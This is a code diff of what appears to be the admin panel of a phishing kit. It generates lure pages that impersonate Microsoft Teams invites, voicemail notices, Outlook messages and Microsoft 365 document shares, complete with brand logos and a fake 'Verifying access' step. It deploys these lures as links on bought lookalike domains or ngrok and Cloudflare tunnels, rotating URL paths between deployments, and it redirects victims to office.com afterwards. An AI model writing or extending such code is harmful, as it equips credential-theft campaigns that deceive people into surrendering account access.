+            const logoSrc = cfg.logo_data || brandLogos[t] || '/static/img/logo_microsoft.png';
+            const iconSvg = `<img src="${logoSrc}" alt="${t}" style="max-height:48px; max-width:140px; margin:0 auto 14px; display:block; object-fit:contain;">`;
+
+            const showBg = cfg.show_bg_image !== false && cfg.bg_image;
+            const bgBlurPx = Math.round(((cfg.blur || cfg.page_bg_blur || 8) / 100) * 32);
+            const bgLayerHtml = showBg ? `<div class="page-bg-layer bg-layer" style="position:fixed; inset:-35px; width:calc(100% + 70px); height:calc(100% + 70px); background: url('${cfg.bg_image}') center/cover no-repeat; filter: blur(${bgBlurPx}px); -webkit-filter: blur(${bgBlurPx}px); transform: scale(1.04); z-index:0; pointer-events:none;"></div>` : '';
+
+            const statusPill = (cfg.show_status_tag !== false && cfg.status_tag) ? `<div class="status-pill">${cfg.status_tag}</div>` : '';
+            const h1Html = (cfg.show_title !== false && cfg.title) ? `<h1>${cfg.title}</h1>` : '';
+            const descHtml = (cfg.show_desc !== false && cfg.desc) ? `<p class="desc">${cfg.desc}</p>` : '';
+
+            let middleContentHtml = '';
+
+            if (t === 'Microsoft Teams' || t === 'Teams' || t === 'Teams Meeting') {
+                const topic = (cfg.show_meeting_topic !== false && cfg.meeting_topic) ? `<div style="font-size:0.95rem; font-weight:600; color:${cfg.btn_color || '#5B5FC7'}; margin-bottom:12px;">${cfg.meeting_topic}</div>` : '';
+                const org = (cfg.show_meeting_organizer !== false && cfg.meeting_organizer) ? `
+                    <div style="display:flex; align-items:center; gap:10px; padding-bottom:10px; border-bottom:1px dashed #dcdcee; margin-bottom:10px;">
+                        <div style="width:34px; height:34px; border-radius:50%; background:linear-gradient(135deg, #5B5FC7, #333A8C); color:#fff; display:flex; align-items:center; justify-content:center; font-size:0.75rem; font-weight:700;">DV</div>
+                        <div style="display:flex; flex-direction:column; text-align:left;">
+                            <span style="font-size:0.82rem; font-weight:700; color:#202030;">${cfg.meeting_organizer}</span>
+                            <span style="font-size:0.70rem; color:#707086;">Invited you to Microsoft Teams Video Conference</span>
+                        </div>
+                    </div>` : '';
+                const mTime = (cfg.show_meeting_time !== false && cfg.meeting_time) ? `<div>🕒 ${cfg.meeting_time}</div>` : '';
+                const mId = (cfg.show_meeting_id !== false && cfg.meeting_id) ? `<div>🆔 ID: ${cfg.meeting_id}</div>` : '';
+                const mPass = (cfg.show_meeting_passcode !== false && cfg.meeting_passcode) ? `<div>🔑 Passcode: ${cfg.meeting_passcode}</div>` : '';
+                const metaGrid = (mTime || mId || mPass) ? `<div style="display:grid; grid-template-columns:1fr 1fr; gap:6px; font-size:0.73rem; color:#555566; text-align:left;">${mTime}<div>🔒 Encrypted Room</div>${mId}${mPass}</div>` : '';
+                const detailsBox = (org || metaGrid) ? `<div style="background:#f8f8fc; border:1px solid #e2e2ee; border-radius:12px; padding:12px 14px; margin-bottom:14px;">${org}${metaGrid}</div>` : '';
+                const lobby = (cfg.show_meeting_lobby !== false && cfg.meeting_lobby_note) ? `<div style="display:flex; align-items:center; gap:8px; background:rgba(91,95,199,0.05); border-radius:20px; padding:6px 12px; margin-bottom:14px; font-size:0.74rem; color:#464EB8; font-weight:600;">👥 <span>${cfg.meeting_lobby_note}</span></div>` : '';
+                middleContentHtml = `${topic}${descHtml}${detailsBox}${lobby}`;
+            } else if (t === 'Cloud Voicemail' || t === 'Voicemail') {
+                const caller = (cfg.show_vm_caller !== false && cfg.caller_id) ? `📞 ${cfg.caller_id}` : '';
+                const vTime = (cfg.show_vm_time !== false && cfg.received_time) ? cfg.received_time : '';
+                const vDur = (cfg.show_vm_duration !== false && cfg.audio_duration) ? `${cfg.audio_duration} (HD Audio)` : '';
+                middleContentHtml = `${descHtml}
+                <div style="background:#f4f8fc; border:1px solid #d8e8f8; border-radius:14px; padding:12px 14px; margin-bottom:14px; text-align:left;">
+                    <div style="display:flex; justify-content:space-between; font-size:0.75rem; font-weight:700; color:#1c3550; margin-bottom:8px;">
+                        <span>${caller}</span><span style="font-weight:400; color:#7890a8;">${vTime}</span>
+                    </div>
+                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
+                        <div style="width:36px; height:36px; border-radius:50%; background:linear-gradient(135deg, ${cfg.btn_color || '#0078D4'}, #004E8C); color:#fff; display:flex; align-items:center; justify-content:center;">▶</div>
+                        <div style="display:flex; gap:3px; flex-grow:1; align-items:center; height:24px;">
+                            ${[10,18,24,14,22,26,16,24,12,20,26,18,12,24,14,8].map(h => `<span style="width:3px; height:${h}px; background:#c0d8f0; border-radius:2px;"></span>`).join('')}
+                        </div>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; font-size:0.70rem; color:#7088a0;">
+                        <span>0:00</span><span>${vDur}</span>
+                    </div>
+                </div>`;
+            } else if (t === 'Outlook') {
+                const sender = (cfg.show_outlook_sender !== false && cfg.outlook_sender) ? `
+                    <div style="display:flex; gap:8px; padding-bottom:8px; border-bottom:1px dashed #e2edf8; margin-bottom:8px;">
+                        <span>📧</span>
+                        <div style="display:flex; flex-direction:column; text-align:left;">
+                            <span style="font-size:0.65rem; font-weight:700; color:#7b94ad;">FROM / MAILBOX</span>
+                            <span style="font-size:0.80rem; font-weight:600; color:#243b53;">${cfg.outlook_sender}</span>
+                        </div>
+                    </div>` : '';
+                const subj = (cfg.show_outlook_subject !== false && cfg.outlook_subject) ? `
+                    <div style="display:flex; gap:8px; padding-bottom:8px; border-bottom:1px dashed #e2edf8; margin-bottom:8px;">
+                        <span>📋</span>
+                        <div style="display:flex; flex-direction:column; text-align:left;">
+                            <span style="font-size:0.65rem; font-weight:700; color:#7b94ad;">SUBJECT</span>
+                            <span style="font-size:0.80rem; font-weight:700; color:#0078D4;">${cfg.outlook_subject}</span>
+                        </div>
+                    </div>` : '';
+                const sec = (cfg.show_outlook_meta !== false && cfg.outlook_meta) ? `
+                    <div style="display:flex; gap:8px;">
+                        <span>🔒</span>
+                        <div style="display:flex; flex-direction:column; text-align:left;">
+                            <span style="font-size:0.65rem; font-weight:700; color:#7b94ad;">SECURITY POLICY</span>
+                            <span style="font-size:0.72rem; color:#486581;">${cfg.outlook_meta}</span>
+                        </div>
+                    </div>` : '';
+                const msgBox = (sender || subj || sec) ? `<div style="background:#f8fafd; border:1px solid #dce8f5; border-radius:12px; padding:12px 14px; margin-bottom:16px;">${sender}${subj}${sec}</div>` : '';
+                middleContentHtml = `${descHtml}${msgBox}`;
+            } else {
+                let docRowHtml = '';
+                const badge = (cfg.show_doc_badge !== false && cfg.doc_badge) ? `<span class="badge">${cfg.doc_badge}</span>` : '';
+                const name = (cfg.show_doc_name !== false && cfg.doc_name) ? `<div class="doc-name">${cfg.doc_name}</div>` : '';
+                const sub = (cfg.show_doc_meta !== false && (cfg.doc_meta || cfg.doc_sub)) ? `<div class="doc-sub">${cfg.doc_meta || cfg.doc_sub}</div>` : '';
+                if (badge || name || sub) {
+                    docRowHtml = `<div class="doc-row">${badge}<div>${name}${sub}</div></div>`;
+                }
+                middleContentHtml = `${descHtml}${docRowHtml}`;
+            }
+
+            const btnHtml = (cfg.show_btn_label !== false && cfg.btn_label) ? `<a class="btn" href="#" onclick="document.getElementById('spin').style.display='flex';return false;">🔒 ${cfg.btn_label}</a>` : '';
+            let footerHtml = '';
+            const f1 = (cfg.show_foot1 !== false && cfg.foot1) ? `<div class="f1">${cfg.foot1}</div>` : '';
+            const f2 = (cfg.show_foot2 !== false && cfg.foot2) ? `<div class="f2">🔒 ${cfg.foot2}</div>` : '';
+            if (f1 || f2) {
+                footerHtml = `<div class="footer">${f1}${f2}</div>`;
+            }
+
+            return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><style>
+            * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+            html, body { width: 100%; height: 100vh; max-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; background: ${cfg.page_color || '#ffffff'}; margin: 0; padding: 0; }
+            .bg-layer { position: absolute; inset: 0; width: 100%; height: 100%; ${bgStyle} z-index: 1; overflow: hidden; }
+            .card-wrap { position: relative; z-index: 2; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; padding: 10px; }
+            .card { background: ${cfg.card_bg || '#ffffff'}; border-radius: 16px; box-shadow: 0 16px 48px rgba(0,0,0,0.12), 0 3px 12px rgba(0,0,0,0.06), inset 0 1px 0 rgba(255,255,255,0.7); padding: clamp(18px, 2.8vh, 32px) clamp(18px, 3vw, 30px); max-width: 400px; width: 92%; max-height: 96vh; text-align: center; border: 1px solid rgba(0,0,0,0.08); box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; }
+            .status-pill { display: inline-flex; align-items: center; gap: 6px; padding: 4px 12px; background: rgba(0,0,0,0.04); border: 1px solid rgba(0,0,0,0.06); color: #444455; border-radius: 20px; font-size: 0.70rem; font-weight: 700; margin: 0 auto 12px; letter-spacing: 0.03em; text-transform: uppercase; }
+            .status-pill::before { content: ''; width: 7px; height: 7px; border-radius: 50%; background: #107C41; display: inline-block; box-shadow: 0 0 6px rgba(16,124,65,0.7); }
+            h1 { font-size: 1.08rem; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
+            .desc { font-size: 0.82rem; color: #555566; margin-bottom: 16px; line-height: 1.45; }
+            .doc-row { background: #f8f9fc; border: 1px solid #e2e5eb; border-radius: 10px; padding: 10px 13px; display: flex; align-items: center; gap: 12px; margin-bottom: 16px; text-align: left; box-shadow: inset 0 1px 2px rgba(0,0,0,0.03); }
+            .badge { background: linear-gradient(135deg, ${cfg.btn_color || '#0078D4'}, #111122); color: #fff; font-size: 0.70rem; font-weight: 800; padding: 6px 9px; border-radius: 6px; flex-shrink: 0; letter-spacing: 0.6px; box-shadow: 0 2px 7px rgba(0,0,0,0.16), inset 0 1px 0 rgba(255,255,255,0.25); text-transform: uppercase; }
+            .doc-name { font-size: 0.84rem; font-weight: 600; color: #1a1a1a; word-break: break-word; }
+            .doc-sub { font-size: 0.70rem; color: #777788; margin-top: 1px; }
+            .btn { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 12px 20px; background: linear-gradient(135deg, ${cfg.btn_color || '#0078D4'}, #151525); color: #fff; border: none; border-radius: 8px; font-size: 0.92rem; font-weight: 700; cursor: pointer; text-decoration: none; box-shadow: 0 4px 16px rgba(0,0,0,0.20), inset 0 1px 0 rgba(255,255,255,0.25); }
+            .footer { margin-top: 12px; }
+            .f1 { font-size: 0.72rem; color: #777788; margin-bottom: 2px; }
+            .f2 { font-size: 0.68rem; color: #9999aa; }
+            #spin { display:none; position:fixed; inset:0; background:rgba(255,255,255,.88); align-items:center; justify-content:center; z-index:99; flex-direction:column; gap:14px; }
+            .s { width:${cfg.spinner_size || 44}px; height:${cfg.spinner_size || 44}px; border:4px solid #e0e0e0; border-top-color:${cfg.spinner_color || cfg.btn_color || '#0078D4'}; border-radius:50%; animation:r .85s linear infinite; }
+            @keyframes r { to { transform:rotate(360deg); } }
+            </style></head>
+            <body>
+            ${bgLayerHtml}
+            <div id="spin"><div class="s"></div><p style="color:#666;font-size:.88rem">Verifying access…</p></div>
+            <div class="card-wrap">
+              <div class="card">
+                ${iconSvg}
+                ${statusPill}
+                ${h1Html}
+                ${middleContentHtml}
+                ${btnHtml}
+                ${footerHtml}
+              </div>
+            </div>
+            </body></html>`;
+        }
+
+        async function deployLink() {
+            const domain = getEffectiveDomain();
+            const sub = document.getElementById('lg-subdomain')?.value.trim();
+            const path = document.getElementById('lg-path')?.value.trim() || 'verify';
+            const templateName = document.getElementById('lg-template-select')?.value || 'Microsoft 365';
+            const isPrelandEnabled = templateName !== 'None';
+            const landingTemplate = document.getElementById('lg-landing-template')?.value || (isPrelandEnabled ? templateName : 'Microsoft 365');
+            const successTemplate = document.getElementById('lg-success-template')?.value || landingTemplate;
+            const successUrl = document.getElementById('lg-landing-url')?.value || 'https://www.office.com/';
+            const isTunnel = domain.includes('ngrok') || domain.includes('loca.lt') || domain.includes('trycloudflare') || domain.includes('cloudflare');
+            const effectiveSub = isTunnel ? '' : sub;
+
+            const payload = {
+                name: isPrelandEnabled ? `${templateName} Deployment` : `${landingTemplate} Direct Deployment`,
+                domain: domain,
+                subdomain: effectiveSub,
+                path: path,
+                preland_template_name: isPrelandEnabled ? templateName : null,
+                preland_enabled: isPrelandEnabled,
+                landing_template_name: landingTemplate,
+                success_template_name: successTemplate,
+                landing_mode: lgCurrentLandingMode,
+                success_url: successUrl,
+                languages: ["en"],
+                config: isPrelandEnabled ? getEditorConfig() : { enabled: false },
+                landing_config: getLandingConfig(),
+                success_config: getSuccessConfig()
+            };
+
+            try {
+                const res = await fetch('/api/lg/deployments', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+                if (!res.ok) {
+                    const errData = await res.json().catch(() => ({}));
+                    throw new Error(errData.error || `Server responded with ${res.status}`);
+                }
+                const data = await res.json();
+                if (!data.id) {
+                    throw new Error(data.error || 'Failed to create deployment');
+                }
+                const deployRes = await fetch(`/api/lg/deployments/${data.id}/deploy`, { method: 'POST' });
+                if (!deployRes.ok) {
+                    const deployErr = await deployRes.json().catch(() => ({}));
+                    throw new Error(deployErr.error || `Activation failed with status ${deployRes.status}`);
+                }
+                const deployData = await deployRes.json().catch(() => ({}));
+                const isLocal = (domain.includes('127.0.0.1') || domain.includes('localhost')) && !isTunnel;
+                const proto = isLocal ? 'http://' : 'https://';
+                const host = (!isLocal && !isTunnel && sub) ? (sub + '.' + domain) : domain;
+                const fullUrl = deployData.url || data.full_url || `${proto}${host}/${path}`;
+                showToast('🚀 Link deployed & activated: ' + fullUrl);
+                loadDeploymentsTable();
+                
+                // Auto-advance path input to next text slug for this template so sequential deploys don't collide
+                if (!lgPathUserCustomized) {
+                    const list = LG_TEMPLATE_SLUGS[templateName] || [];
+                    if (list.length > 1) {
+                        const curIdx = list.indexOf(path);
+                        const nextSlug = list[(curIdx + 1) % list.length];
+                        const pathInp = document.getElementById('lg-path');
+                        if (pathInp) {
+                            pathInp.value = nextSlug;
+                            onFieldChange();
+                        }
+                    }
+                }
+            } catch(e) {
+                alert('Deploy error: ' + (e.message || e));
+            }
+        }
+
+        async function loadDeploymentsTable() {
+            const tbody = document.getElementById('lg-deployments-tbody');
+            if (!tbody) return;
+            try {
+                const res = await fetch('/api/lg/deployments');
+                const list = await res.json();
+                if (!list || !list.length) {
+                    tbody.innerHTML = `<tr><td colspan="9" style="text-align:center; color:#a49498; padding:20px;">No deployments yet. Click "🚀 Deploy" above to create one.</td></tr>`;
+                    return;
+                }
+                tbody.innerHTML = list.map(d => {
+                    const curHost = window.location.host;
+                    const isRemote = curHost && !curHost.includes('127.0.0.1') && !curHost.includes('localhost');
+                    const isTunnel = d.domain && (d.domain.includes('ngrok') || d.domain.includes('loca.lt') || d.domain.includes('trycloudflare') || d.domain.includes('cloudflare'));
+                    const isLocal = d.domain && (d.domain.includes('127.0.0.1') || d.domain.includes('localhost'));
+                    let url = d.full_url;
+                    if (isRemote && (!url || url.includes('127.0.0.1') || url.includes('localhost'))) {
+                        url = `${window.location.origin}/${d.path || ''}`;
+                    } else if (!url) {
+                        const proto = (isLocal && !isTunnel) ? 'http://' : 'https://';
+                        const host = (!isLocal && !isTunnel && d.subdomain) ? `${d.subdomain}.${d.domain}` : d.domain;
+                        url = `${proto}${host}/${d.path || ''}`;
+                    }
+                    const localTestUrl = `/${d.path || ''}`;
+                    const preName = d.preland_name 
+                        ? `<span style="color:#f0ebed; font-size:12px; font-weight:600;">📄 ${d.preland_name}</span>`
+                        : `<span style="color:#786694; font-size:11px; font-style:italic;">🚫 None (Direct)</span>`;
+                    const landName = d.landing_name || d.name || 'Microsoft 365';
+                    const succName = d.success_name || landName;
+                    const createdStr = d.created_at ? d.created_at.replace('T', ' ').substring(0, 19) : 'Just now';
+                    const statusBadge = d.status === 'paused'
+                        ? `<span style="background:#374151; color:#9ca3af; border:1px solid #4b5563; padding:3px 8px; border-radius:12px; font-size:0.7rem; font-weight:700;">PAUSED</span>`
+                        : `<span class="lg-pill-green">ACTIVE</span>`;
+
+                    return `<tr>
+                        <td><input type="checkbox" class="lg-row-chk" value="${d.id}" data-id="${d.id}"></td>
+                        <td>
+                            <span onclick="copyDeploymentLink('${url}')" class="lg-link-txt" title="Click to copy link" style="cursor:pointer; display:inline-block; user-select:text;">
+                                ${url}
+                            </span>
+                        </td>
+                        <td><b style="color:#ffffff;">${d.name || 'Deployment'}</b></td>
+                        <td>${preName}</td>
+                        <td><span style="color:#ff6b72; font-weight:600;">${landName}</span></td>
+                        <td><span style="color:#a49498;">${succName}</span></td>
+                        <td>${statusBadge}</td>
+                        <td>${createdStr}</td>
+                        <td>
+                            <a href="${localTestUrl}" target="_blank" class="lg-icon-btn" title="Test locally in browser" style="text-decoration:none; color:#34d399; border-color:#059669; font-weight:700;">▶ Test</a>
+                            <button class="lg-icon-btn" onclick="deleteDeploymentRow(${d.id})" title="Delete Deployment">🗑️</button>
+                        </td>
+                    </tr>`;
+                }).join('');
+            } catch(e) {
+                tbody.innerHTML = `<tr><td colspan="9" style="text-align:center; color:#a4262c;">Failed to load deployments.</td></tr>`;
+            }
+        }
+
+        async function deleteSelectedDeployments() {
+            const checkedBoxes = Array.from(document.querySelectorAll('.lg-row-chk:checked'));
+            if (!checkedBoxes.length) {
+                showToast('⚠️ No deployments selected. Check the boxes of the links you want to delete.');
+                return;
+            }
+            const ids = checkedBoxes.map(cb => parseInt(cb.value, 10)).filter(id => !isNaN(id));
+            const ok = await appConfirm({
+                title: 'Delete Selected Deployments',
+                message: `Are you sure you want to permanently delete ${ids.length} selected deployment(s)? The link(s) will stop functioning immediately.`,
+                confirmText: 'Delete Selected',
+                icon: '🗑️',
+                danger: true
+            });
+            if (!ok) return;
+
+            try {
+                const res = await fetch('/api/lg/deployments/batch-delete', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ids })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`🗑️ Successfully deleted ${ids.length} deployment(s)`);
+                    const chkAll = document.getElementById('lg-check-all');
+                    if (chkAll) chkAll.checked = false;
+                    loadDeploymentsTable();
+                } else {
+                    showToast('⚠️ Delete failed: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Batch delete error: ' + e);
+            }
+        }
+
+        function copyDeploymentLink(url) {
+            navigator.clipboard.writeText(url).then(() => {
+                showToast('✓ Link copied successfully!');
+            }).catch(() => {
+                try {
+                    const temp = document.createElement('textarea');
+                    temp.value = url;
+                    document.body.appendChild(temp);
+                    temp.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(temp);
+                } catch(e) {}
+                showToast('✓ Link copied successfully!');
+            });
+        }
+
+        async function deleteDeploymentRow(did) {
+            const ok = await appConfirm({
+                title: 'Delete Deployment',
+                message: 'Are you sure you want to permanently delete this deployment? The link will stop functioning immediately.',
+                confirmText: 'Delete',
+                icon: '🗑️',
+                danger: true
+            });
+            if (!ok) return;
+            try {
+                const res = await fetch(`/api/lg/deployments/${did}`, { method: 'DELETE' });
+                const data = await res.json().catch(() => ({}));
+                if (data.success !== false) {
+                    showToast('🗑️ Deployment deleted successfully');
+                    loadDeploymentsTable();
+                } else {
+                    showToast('⚠️ Delete failed: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Delete failed: ' + e);
+            }
+        }
+
+        function copyAllLinks() {
+            const links = Array.from(document.querySelectorAll('.lg-link-txt')).map(a => a.innerText.trim() || a.href);
+            if (!links.length) return showToast('⚠️ No links to copy');
+            navigator.clipboard.writeText(links.join('\n')).then(() => {
+                showToast(`✓ Copied ${links.length} link(s) to clipboard!`);
+            });
+        }
+
+        function toggleAllDeployChecks(master) {
+            document.querySelectorAll('.lg-row-chk').forEach(c => c.checked = master.checked);
+        }
+
+        // ── DOMAIN STORE & MANAGER FUNCTIONS ─────────────────────────
+        function openBuyDomainsModal() {
+            const m = document.getElementById('buyDomainsModal');
+            if (m) {
+                m.classList.add('active');
+                switchDomainTab('search');
+            }
+        }
+
+        function closeBuyDomainsModal() {
+            const m = document.getElementById('buyDomainsModal');
+            if (m) m.classList.remove('active');
+        }
+
+        function openDeletedDomainsModal() {
+            const m = document.getElementById('deletedDomainsModal');
+            if (m) {
+                m.classList.add('active');
+                loadDeletedDeploymentsTable();
+            }
+        }
+
+        function closeDeletedDomainsModal() {
+            const m = document.getElementById('deletedDomainsModal');
+            if (m) m.classList.remove('active');
+        }
+
+        function switchDomainTab(tab) {
+            ['search', 'owned', 'manual'].forEach(t => {
+                const btn = document.getElementById('tab-btn-' + t);
+                const pane = document.getElementById('dm-tab-pane-' + t);
+                if (btn) btn.classList.toggle('active', t === tab);
+                if (pane) pane.style.display = (t === tab ? 'flex' : 'none');
+            });
+            if (tab === 'owned') loadOwnedDomainsTable();
+        }
+
+        async function searchDomains() {
+            const kw = document.getElementById('dm-search-keyword')?.value.trim();
+            if (!kw) {
+                showToast('⚠️ Please enter a keyword or domain to search');
+                return;
+            }
+
+            const selectedTlds = Array.from(document.querySelectorAll('.dm-tld-chip input:checked')).map(cb => cb.value);
+            const loading = document.getElementById('dm-search-loading');
+            const box = document.getElementById('dm-search-results-box');
+            const tbody = document.getElementById('dm-search-results-tbody');
+
+            if (loading) loading.style.display = 'block';
+            if (box) box.style.display = 'none';
+
+            try {
+                let list = [];
+                if (kw.includes('.')) {
+                    const res = await fetch('/api/lg/domains/search', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ domains: [kw] })
+                    });
+                    list = await res.json();
+                } else {
+                    const res = await fetch('/api/lg/domains/suggest', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ keyword: kw, tlds: selectedTlds.length ? selectedTlds : ['com','net','org','info','xyz','io'] })
+                    });
+                    list = await res.json();
+                }
+
+                if (loading) loading.style.display = 'none';
+                if (box) box.style.display = 'block';
+
+                if (!list || !list.length || list[0]?.error) {
+                    const errMsg = list[0]?.error || 'No results returned or Namecheap API credentials not configured.';
+                    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#f87171; padding:20px;">
+                        ⚠️ ${errMsg}<br><small style="color:#ff6b72;">You can manually register your domain with any registrar and add it using the "➕ Add Custom Domain" tab above.</small>
+                    </td></tr>`;
+                    return;
+                }
+
+                tbody.innerHTML = list.map(item => {
+                    const dName = item.domain || '';
+                    const parts = dName.split('.');
+                    const sld = parts[0] || '';
+                    const tld = parts.slice(1).join('.') || '';
+                    const isAvail = item.available === true;
+                    const price = item.price ? ('$' + parseFloat(item.price).toFixed(2)) : '$8.88';
+
+                    return `<tr>
+                        <td><strong style="color:#ffffff;">${dName}</strong></td>
+                        <td>${isAvail ? '<span class="dm-badge-avail">Available</span>' : '<span class="dm-badge-taken">Unavailable</span>'}</td>
+                        <td><span class="dm-price-tag">${isAvail ? price : '—'}</span></td>
+                        <td>
+                            ${isAvail ? `<button type="button" class="dm-btn" style="padding:5px 12px; font-size:0.75rem;" onclick="buyDomain('${sld}', '${tld}', '${price}')">💳 Buy Now</button>` : '<span style="color:#6b7280; font-size:0.75rem;">Taken</span>'}
+                        </td>
+                    </tr>`;
+                }).join('');
+
+            } catch (err) {
+                if (loading) loading.style.display = 'none';
+                if (box) box.style.display = 'block';
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#f87171; padding:20px;">Search request failed: ${err}</td></tr>`;
+            }
+        }
+
+        async function buyDomain(sld, tld, price) {
+            const domain = `${sld}.${tld}`;
+            const ok = await appConfirm({
+                title: 'Purchase & Register Domain',
+                message: `Are you sure you want to purchase and register ${domain} (${price}/yr)? It will immediately be added to your active owned domains.`,
+                confirmText: 'Register Domain',
+                icon: '🛒',
+                danger: false
+            });
+            if (!ok) return;
+
+            showToast(`Initiating registration for ${domain}...`);
+            try {
+                const res = await fetch('/api/lg/domains/purchase', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ sld: sld, tld: tld, years: 1 })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`🎉 ${domain} registered successfully! Added to your owned domains.`);
+                    await syncDomainsDropdown();
+                    switchDomainTab('owned');
+                } else {
+                    showToast('⚠️ Registration failed: ' + (data.message || 'API error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Purchase error: ' + e);
+            }
+        }
+
+        async function addCustomDomain() {
+            const dInput = document.getElementById('dm-custom-domain-name');
+            const pInput = document.getElementById('dm-custom-provider');
+            const domain = (dInput?.value || '').trim().toLowerCase();
+            const provider = (pInput?.value || 'Manual DNS').trim();
+
+            if (!domain) return showToast('⚠️ Please enter a domain name');
+            if (!domain.includes('.')) return showToast('⚠️ Please enter a valid domain (e.g. portal-auth.com)');
+
+            try {
+                const res = await fetch('/api/lg/domains', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ domain: domain, registrar: provider })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(`✓ Domain ${domain} added successfully!`);
+                    if (dInput) dInput.value = '';
+                    await syncDomainsDropdown();
+                    switchDomainTab('owned');
+                } else {
+                    showToast('⚠️ Failed to add domain: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Add domain error: ' + e);
+            }
+        }
+
+        async function loadOwnedDomainsTable() {
+            const tbody = document.getElementById('dm-owned-domains-tbody');
+            if (!tbody) return;
+            try {
+                const res = await fetch('/api/lg/domains');
+                const domains = await res.json();
+                if (!domains || !domains.length) {
+                    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:#a49498; padding:20px;">No domains registered yet. Buy one with Namecheap or add a custom domain.</td></tr>`;
+                    return;
+                }
+                tbody.innerHTML = domains.map(d => {
+                    const isNs = d.ns_configured === 1 || d.ns_configured === true;
+                    return `<tr>
+                        <td><strong style="color:#ffffff;">${d.domain}</strong></td>
+                        <td>${d.registrar || 'Namecheap'}</td>
+                        <td>
+                            <button type="button" class="dm-btn dm-btn-secondary" style="padding:4px 8px; font-size:0.72rem; ${isNs ? 'border-color:#10b981; color:#34d399;' : ''}" onclick="toggleDomainNs('${d.domain}', ${isNs ? 0 : 1})">
+                                ${isNs ? '✅ Configured' : '⏳ Pending'}
+                            </button>
+                        </td>
+                        <td>${d.added_at ? d.added_at.substring(0, 10) : 'Active'}</td>
+                        <td>
+                            <button type="button" class="lg-icon-btn" onclick="useDomainForDeployment('${d.domain}')" title="Use in Builder">🚀 Use</button>
+                            <button type="button" class="lg-icon-btn" onclick="deleteDomainItem('${d.domain}')" title="Delete Domain">🗑️</button>
+                        </td>
+                    </tr>`;
+                }).join('');
+            } catch(e) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:#f87171;">Failed to load domains: ${e}</td></tr>`;
+            }
+        }
+
+        async function toggleDomainNs(domain, val) {
+            try {
+                await fetch(`/api/lg/domains/${domain}/ns`, {
+                    method: 'PATCH',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ns_configured: val })
+                });
+                loadOwnedDomainsTable();
+                showToast(`Nameservers updated for ${domain}`);
+            } catch(e) {}
+        }
+
+        async function deleteDomainItem(domain) {
+            const ok = await appConfirm({
+                title: 'Remove Domain',
+                message: `Are you sure you want to retire ${domain}? It will be moved to the Deleted Domains & Retirements archive.`,
+                confirmText: 'Remove Domain',
+                icon: '🗑️',
+                danger: true
+            });
+            if (!ok) return;
+            try {
+                await fetch(`/api/lg/domains/${encodeURIComponent(domain)}`, { method: 'DELETE' });
+                showToast(`Domain ${domain} retired to archive`);
+                await syncDomainsDropdown();
+                loadOwnedDomainsTable();
+                loadDeletedDeploymentsTable();
+            } catch(e) {
+                showToast('⚠️ Delete error: ' + e);
+            }
+        }
+
+        function useDomainForDeployment(domain) {
+            const sel = document.getElementById('lg-domain');
+            if (sel) {
+                if (!Array.from(sel.options).some(o => o.value === domain)) {
+                    const opt = document.createElement('option');
+                    opt.value = domain;
+                    opt.innerText = domain;
+                    sel.appendChild(opt);
+                }
+                sel.value = domain;
+            }
+            updateUrlPreview();
+            closeBuyDomainsModal();
+            showToast(`Active deployment domain set to ${domain}`);
+        }
+
+        async function syncDomainsDropdown() {
+            try {
+                const res = await fetch('/api/lg/domains');
+                const domains = await res.json();
+                const sel = document.getElementById('lg-domain');
+                if (sel) {
+                    const currentVal = sel.value;
+                    const curHost = window.location.host;
+                    const isRemote = curHost && !curHost.includes('127.0.0.1') && !curHost.includes('localhost');
+                    
+                    let opts = '';
+                    if (isRemote) {
+                        const label = curHost.includes('ngrok') ? `${curHost} (Current ngrok Tunnel)` : `${curHost} (Current Host)`;
+                        opts += `<option value="${curHost}">${label}</option>`;
+                    }
+                    opts += `<option value="127.0.0.1:5000">127.0.0.1:5000 (Localhost Dev)</option>`;
+                    if (domains && domains.length) {
+                        opts += domains.map(d => `<option value="${d.domain}">${d.domain}</option>`).join('');
+                    }
+                    opts += `<option value="__custom__">➕ Enter Custom Domain / ngrok URL...</option>`;
+                    sel.innerHTML = opts;
+                    if (currentVal && Array.from(sel.options).some(o => o.value === currentVal)) {
+                        sel.value = currentVal;
+                    } else if (isRemote) {
+                        sel.value = curHost;
+                    }
+                }
+            } catch(e) {}
+        }
+
+        async function loadDeletedDeploymentsTable() {
+            const tbody = document.getElementById('dm-deleted-tbody');
+            if (!tbody) return;
+            try {
+                const [depRes, domRes] = await Promise.all([
+                    fetch('/api/lg/deployments?only_deleted=true'),
